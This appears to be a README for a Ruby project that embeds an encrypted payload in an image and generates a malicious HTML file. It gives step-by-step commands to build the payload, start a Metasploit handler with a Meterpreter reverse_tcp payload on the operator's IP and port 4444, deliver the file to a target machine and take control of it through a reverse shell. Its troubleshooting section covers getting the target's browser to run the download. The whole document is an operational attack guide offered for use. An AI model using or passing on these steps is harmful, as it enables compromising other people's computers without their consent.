Installation Instructions
=========================

This file provides step-by-step instructions on how to install and set up the embedded image payload module project.

Prerequisites
-------------

Before proceeding with the installation, ensure that you have the following prerequisites installed on your system:

- Ruby programming language (version 2.7 or higher)
- Metasploit framework

If you don't have Ruby installed, you can download and install it from the [Official Ruby](https://www.ruby-lang.org/) website.

To install the Metasploit framework, follow the installation instructions specific to your operating system. You can find the installation guide on the [Official Metasploit](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html) website.

Installation Steps
------------------

1. Clone the repository:

   ```bash
   git clone https://github.com/webmaster-exit-1/Custom-Image-Payload-Embedder.git
   ```

2. Navigate to the project directory:

   ```bash
   cd Custom-Image-Payload-Embedder
   ```

3. Install the required dependencies using Bundler:

   ```bash
   bundle install
   ```

   This command will install all the necessary Ruby gems specified in the project's Gemfile.

4. Customize the module and payload (optional):
   - Open the `module.rb` file in a text editor and modify the module options, such as the image path and output path, according to your requirements.
   - Open the `payload.rb` file in a text editor and customize the payload generation and obfuscation techniques as needed.

5. Generate the payload and embed it into the image:

   ```rb
   ruby exploit.rb
   ```

   This command will execute the `exploit.rb` script, which will generate the payload, encrypt it, embed it into the specified image file, and generate a malicious HTML file.

6. Set up the Metasploit handler:
   - Open a new terminal window and start the Metasploit console:

     ```bash
     msfconsole
     ```

   - Select the `exploit/multi/handler` module:

     ```rb
     use exploit/multi/handler
     ```

   - Set the payload to match the one used in the malicious HTML file:

     ```rb
     set PAYLOAD windows/meterpreter/reverse_tcp
     ```

   - Set the `LHOST` and `LPORT` options to specify the IP address and port for the reverse shell connection:

     ```rb
     set LHOST YOUR_IP
     set LPORT 4444
     ```

   - Start the handler:

     ```rb
     run
     ```

   Replace `YOUR_IP` with the actual IP address of your machine where you want to receive the reverse shell connection.

7. Transfer the generated malicious HTML file to the target machine and open it in a web browser.

8. Once the payload is executed, a reverse shell connection will be established, and you can interact with the target machine using Meterpreter commands.

Troubleshooting
---------------

If you encounter any issues during the installation or usage of the embedded image payload module, consider the following troubleshooting steps:

- Ensure that you have the correct version of Ruby installed (version 2.7 or higher).
- Verify that you have installed the Metasploit framework correctly and that it is accessible from the command line.
- Double-check the module options in the `module.rb` file and ensure that the specified paths and settings are correct.
- Ensure that the target machine has a web browser capable of executing JavaScript and that it allows running downloaded files.
- Check the Metasploit console for any error messages or warnings that may indicate issues with the payload or handler setup.
